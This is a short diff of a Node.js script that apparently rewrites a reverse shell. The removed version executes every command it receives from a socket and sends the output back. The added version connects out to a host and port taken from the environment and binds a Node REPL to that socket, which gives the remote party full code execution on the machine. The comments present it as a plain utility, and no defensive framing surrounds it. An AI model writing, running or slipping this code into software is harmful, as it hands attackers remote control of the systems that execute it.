@@ -1,19 +1,20 @@
 const net = require('net');
-const { exec } = require('child_process');
+const repl = require('repl');
 
-const socket = net.createConnection(8080, 'localhost');
-socket.on('data', (command) => {
-  const childProcess = exec(String(command));
+// Port to connect to. Defaults to 8080
+const PORT = process.env.PORT || 8080;
 
-  childProcess.stdout.on('data', (data) => {
-    socket.write(`stdout: ${data}`);
-  });
+// Host to connect to. Defaults to localhost
+const HOST = process.env.HOST || 'localhost';
 
-  childProcess.stderr.on('data', (data) => {
-    socket.write(`stderr: ${data}`);
-  });
+// Create a TCP socket client
+const socket = net.createConnection(PORT, HOST);
 
-  childProcess.on('close', (code) => {
-    socket.write(`close: ${command} exited with code ${code}`);
-  });
+// Print any error on client console for debugging
+socket.on('error', error => process.stderr.write(JSON.stringify(error, null, '\t')));
+
+// Create a Node REPL instance and bind the input and output to the socket
+repl.start({
+  input: socket,
+  output: socket,
 });
